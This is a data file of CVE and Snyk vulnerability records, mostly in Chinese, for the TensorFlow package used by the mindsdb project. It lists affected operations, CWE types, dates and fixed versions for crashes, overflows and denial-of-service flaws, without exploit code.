mindsdb_mindsdb,tensorflow,,True,CVE-2022-36000,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 mlir::tfg::ConvertGenericFunctionToFunctionDef 被赋予空函数属性时，它给出一个空解引用。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29208,CWE-787,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.EditDistance对于实现的验证不完整。攻击者可以传递负值来利用该漏洞触发基于分段错误的拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23584,CWE-416,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25660,CWE-476,2023-03-24,Google TensorFlow 是一套用于机器学习的开源平台。该漏洞源于当 `tf.raw_ops.Print` 的参数 `summarize` 为零时，新方法 `SummarizeArray<bool>` 会引用空指针，导致段错误。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29575,CWE-119 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞允许堆栈溢出和/或基于`CHECK`-fail的拒绝服务。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29617,CWE-755,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21738,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现可以通过整数溢出使一个TensorFlow进程崩溃，其结果随后被用于内存分配。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29538,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以导致“Conv2DBackpropFilter”中出现除零。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37638,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于为`tf.rawu ops.RaggedTensorToTensor`API的`rowu partitionu types`发送无效参数将导致空指针取消引用和未定义的行为",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21725,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于某些卷积运算的代价估计器可以用来执行一个被0除的运算。函数未能检查stride参数是否严格为正。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41217,CWE-476,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，当应该配对的节点没有时，为 TensorFlow 模型构建控制流图的过程容易受到空指针异常的影响，该问题可能会导致程序崩溃。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37635,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于软件中的稀疏缩减操作的实现可能会触发堆分配边界之外的数据访问。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35934,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.1、2.8.1和 2.7.2版本存在安全漏洞，该漏洞源于TensorFlow 中 tf.reshape op 的实现很容易受到张量中元素数量溢出影响，导致 CHECK-failure（断言失败），攻击者利用该漏洞可以导致服务拒绝。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35970,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizedInstanceNorm 被赋予 x_min 或 x_max 非零等级的张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23565,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，攻击者可利用该漏洞通过更改磁盘上的 SavedModel 来触发拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37659,CWE-125 CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，攻击者可以通过在所有不需要广播的二进制""cwise""操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21735,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于FractionalMaxPool的实现可以通过除0使TensorFlow进程崩溃。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29530,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以通过向tf.raw_ops.SparseMatrixSparseCholesky提供一个无效的置换来触发空指针解引用。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35989,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 MaxPool 接收到一个窗口大小的输入数组 ksize 的维度大于其输入张量 input 时，GPU 内核会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35996,CWE-369,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于如果 Conv2D 被指定为空 input 并且 filter 和 padding 大小有效，则输出全为零。这会导致除零浮点异常，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29552,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过控制num segments张量参数UnsortedSegmentJoin的值来导致拒绝服务。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29198,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.SparseTensorToCSRSparseMatrix 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41214,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，“tf.ragged.cross”的形状推断代码由于绑定了对“nullptr”的引用而具有未定义的行为。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35999,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 Conv2DBackpropInput 接收到空的 out_backprop 输入（例如 [3, 1, 0, 1] ）时，当前的 CPU/GPU 内核断言失败（一个带有 dnnl，另一个带有 cudnn）。这可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41909,CWE-20 CWE-476,2022-11-18,Google TensorFlow 是一套用于机器学习的开源平台。在某些版本（如 2.11、2.10.1 及之前的 2.10.x、2.9.3 及之前的 2.9.x 版本，以及 2.8.4 之前的 2.8.x 版本）中，一个无效的 `CompositeTensorVariant` 张量输入 `encoded` 会导致 `tf.raw_ops.CompositeTensorVariantToComponents` 触发段错误存。这是由于输入的验证不当导致的代码缺陷。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21737,CWE-754,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于*Bincount操作的实现允许恶意用户通过传入会触发CHECK失败的参数来拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29211,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.histogram_fixed_width值出现非数字元素时应用会发生崩溃。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36026,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果给 QuantizeAndDequantizeV3 一个非标量 num_bits 输入张量，它会导致断言失败，可以用来触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23563,CWE-367,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 TensorFlow 使用 tempfile.mktemp 来创建临时文件。虽然这在测试中是可以接受的，但在实用程序和库中这是危险的，因为不同的进程可以在检查 mktemp 中的文件名和通过后续操作实际创建文件之间创建文件（TOC/TOU 类型弱点）。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21740,CWE-787,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现容易出现堆溢出。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29592,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞允许传递带有null缓冲区支持的张量一维形状。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29522,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以触发一个在tf.raw_ops.Conv3DBackprop*中为0的除法。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25669,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于如果 `tf.raw_ops.AvgPoolGrad` 的步幅和窗口大小不是正数，它会给出浮点异常。",2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29194,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.DeleteSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37692,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于Go 代码可能会触发字符串释放中的段错误。",3,0
mindsdb_mindsdb,tensorflow,,True,,CWE-476,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to NULL Pointer Dereference. A carefully crafted GIF images can produce a null pointer dereference during decoding.
## Remediation
Upgrade `tensorflow` to version 1.12.2 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-1122)
",3,0
mindsdb_mindsdb,tensorflow,,True,,CWE-125,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Out-of-bounds Read. Decoding variant tensors from proto could result in heap out of bounds memory access.
## Remediation
Upgrade `tensorflow` to version 2.0.0 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-200)
",3,0
mindsdb_mindsdb,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35991](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026856), in `TensorListScatter` and `TensorListScatterV2` via non scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1)
",3,0
mindsdb_mindsdb,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35935](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026914) in `SobolSample` via assumed scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit #1](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf)
- [GitHub Commit #2](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)
",2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41908,CWE-20,2022-11-18,Google TensorFlow是一个用于机器学习的端到端开源平台。该漏洞源于不是UTF-8字节串的输入'token'将在'tf.raw_ops.PyFunc'中触发'CHECK'失败。涉及的版本包括2.8.4之前的版本、2.9.0到2.9.3和2.10.0版本。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41200,CWE-617,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，在受影响的版本中，如果使用非标量参数调用 `tf.summary.create_file_writer`，代码会由于 `CHECK` 失败而崩溃。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37645,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于在受影响的版本中，“tf.raw_ops.QuantizeAndDequantizeV4Grad”的实现容易受到整数溢出问题的攻击，这是由于将有符号整数值转换为无符号整数值，然后根据该值分配内存而导致的。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41223,CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，`FusedBatchNorm` 内核的实现容易受到堆 OOB 访问的影响。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21729,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于explaindex的实现容易受到由整数溢出bug引起的除0的影响。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37653,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`ResourceGather`中的除以0错误。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41201,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞可能导致未初始化的变量访问。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23570,CWE-476 CWE-617,2022-02-04,TensorFlow在从protobuf解码张量时，如果某些操作的可变参数的属性缺失，可能会发生空指针解引用。尽管这种情况被`DCHECK`保护，但生产环境下`DCHECK`不会执行任何操作，而在调试构建中会因断言失败而崩溃。在第一种情况下，程序会继续执行到空指针的解引用，而第二种情况下会因断言失败而崩溃。,2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29551,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于MatrixTriangularSolve实现将无法终止内核执行。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29539,CWE-681,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 存在安全漏洞，该漏洞源于代码假定张量内容是纯标量，变体会导致实现中的段错误。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37691,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25661,CWE-20,2023-03-27,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。TensorFlow 2.11.1之前版本存在输入验证错误漏洞，该漏洞源于恶意的无效输入会使tensorflow模型崩溃，并可用于触发拒绝服务攻击。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29562,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29586,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于调用ComputePaddingHeightWidth之前没有检查stride是否为0。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37668,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在数字错误漏洞，该漏洞源于产品的 tf.raw_ops.UnravelIndex 未对除数做有效限制，攻击者可通过除0导致拒绝服务。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25675,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于当使用 XLA 运行 2.12.0 和 2.11.1 之前的版本时，如果给定的参数 weights 与参数 arr 的形状既不相同，也不是长度为 0 的张量，则 `tf.raw_ops.Bincount` 会出现段错误。",2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2020-15211,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者从堆分配的数组的边界之外进行写入和读取。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41883,CWE-125,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。该漏洞源于操作接收到不同数量的输入时，错误地处理输入大小，导致执行程序崩溃。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29203,CWE-190,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.raw_ops.SpaceToBatchND存在整数溢出问题。攻击者可以通过断言失败利用该漏洞实现拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23569,CWE-617,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的多个操作可以通过CHECK失败(即断言失败)来触发拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29207,CWE-20 CWE-475,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于当提供给应用的资源句柄无效时，多个tensorflow操作在急切模式下行为异常。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35968,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 AvgPoolGrad 的实现没有完全验证输入 orig_input_shape 。这会导致断言失败，该失败可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41221,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Cudnn* 操作的形状推断代码可以通过堆缓冲区溢出被欺骗访问无效内存。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37646,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于""tf.raw_ops.StringNGrams""的实现容易受到整数溢出问题的影响，该问题是由将有符号整数值转换为无符号整数值然后根据该值分配内存而引起的。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25672,CWE-476,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在代码问题漏洞，该漏洞源于函数 `tf.raw_ops.LookupTableImportV2` 无法处理 `values` 参数中的标量并给出 NPE。",2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23585,CWE-401,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于当解码PNG图像时，如果图像无效，TensorFlow可能会产生内存泄漏。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25668,CWE-122 CWE-125,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。存在安全漏洞，攻击者可以利用该漏洞访问不受用户控制的堆内存，从而导致程序崩溃或远程代码执行。,1,2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29535,CWE-131 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过传入无效的量化阈值来导致“QuantizedMul”中的堆缓冲区溢出。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41895,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `MirrorPadGrad` 的输入 `paddings` 过大，TensorFlow 将生成堆信息外带（Out of Band）错误，导致缓冲区溢出。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35994,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 CollectiveGather 接收到标量输入 input 时，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29573,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于tf.raw_ops.MaxPoolGradWithArgmax容易被0除法。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41218,CWE-369,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.7.0之前版本存在数字错误漏洞，该漏洞源于TensorFlow中的AllToAll在推断代码时会执行除以0。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41197,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于 TensorFlow 允许张量具有大量维度，并且每个维度都可以根据需要进行调整。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29544,CWE-754,2021-05-14,"TensorFlow是TensorFlow开源的一套用于机器学习的端到端开源平台。
TensorFlow存在代码问题漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37657,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过在所有类型为""tf.raw_ops.MatrixDiagV*""的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23581,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的er优化器可以通过修改SavedModel来导致拒绝服务，这样issimplifiableshape就会触发CHECK失败。",3,0
